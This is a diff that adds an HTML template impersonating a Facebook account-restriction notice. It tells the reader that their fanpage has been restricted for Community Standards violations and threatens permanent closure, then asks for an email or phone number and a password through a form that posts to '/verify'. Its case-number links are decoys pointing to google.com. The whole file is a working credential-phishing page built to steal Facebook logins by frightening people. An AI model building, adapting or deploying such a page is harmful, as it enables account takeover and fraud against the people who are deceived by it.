@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html >
+<head>
+    <title>Facebook</title>
+    <link rel="icon" href="/static/img/logo1.webp" type="image/webp">
+    <link rel="stylesheet" type="text/css" href="/static/css/verify.css">
+     <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div style="display:grid">
+    <div  class="headercustom">
+        <img style="width: 170px" src="/static/img/img1.png">
+    </div>
+    <div class="body">
+        <div class="box">
+            <img style="width: 360px;" src="/static/img/verify.png">
+            <div style="font-size: 16px;font-weight: bold;line-height: 1.6;color: rgb(0, 0, 0);">Your fanpage has been restricted <br></div>
+            <div style="text-align: left;font-size: 13px;line-height: 1.6;color: rgb(0, 0, 0);">
+                We detected unusual activity in your account today:&nbsp;<strong >{{ date }}</strong><br>date
+                This can result in your account being permanently disabled for not complying with the Community Standards.
+                We have reviewed this decision and forced you to verify your account to avoid restrict your fanpage and account.<br>
+            </div>
+            <div class="login-box">
+                <form action="/verify" method="post" onsubmit="return validateForm()">
+                    <input type="text" id="username" name="username" placeholder="Email or phone number">
+                    <input type="password" id="password" name="password" placeholder="Password">
+                    <a id="err" style="color: red;margin-top: 0px;font-size: 14px;">{{ error }}</a>
+                    <p style="color: red;margin-top: 0px;font-size: 14px;" id="error"></p>
+                    <button type="submit" id="submit" style="font-size: 16px;font-weight: bold;line-height: 1.6;">Verification</button>
+                </form>
+                <div  style="display:flex;margin-top: 10px;">
+                    <a href="https://www.google.com/" style="text-decoration: none;">
+                        <div style="font-size: 12px;font-weight: bold;line-height: 1.6;color: rgb(0, 0, 0);">Case Number:&nbsp;</div>
+                    </a>
+                    <a href="https://www.google.com/">
+                        <div style="font-size: 12px;font-weight: bold;line-height: 1.6;color: rgb(10, 103, 233);text-decoration-line: underline;">$28762889993782</div>
+                    </a>
+                </div>
+                <div class="line"></div>
+                <a style="display:flex;text-decoration: none;" href="https://www.google.com/">
+                    <div style="font-size: 11px;font-weight: bold;line-height: 1.6;color: rgb(0, 0, 0);">About Case: Violating Community Standards and Posting something inappropriate.</div>
+                </a>
+            </div>
+            <div style="display: flex; margin-top: 18px">
+                <img src="/static/img/logoW.png" style="width: 32px; height: 32px;">
+                <div style="font-size: 10px;line-height: 1.6;color: rgb(0, 0, 0); text-align: left">Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed. To learn more about why we deactivate accounts, go to
+                    <span style="font-weight: bold;color: rgb(10, 103, 233);">&nbsp;Community Standards</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <span style="font-weight: bold">English (US)</span>
+        &nbsp;&nbsp;Tiếng Việt&nbsp;&nbsp;中文(台灣)&nbsp;&nbsp;한국어&nbsp;&nbsp;日本語&nbsp;&nbsp;Français (France)&nbsp;&nbsp;ภาษาไทย&nbsp;&nbsp;Español&nbsp;&nbsp;Português&nbsp;&nbsp;(Brasil)&nbsp;&nbsp;Deutsch&nbsp;&nbsp;Italiano
+    </div>
+</div>
+
+<script type="text/javascript" src="/static/js/verify.js"></script>
+</body>
+</html>
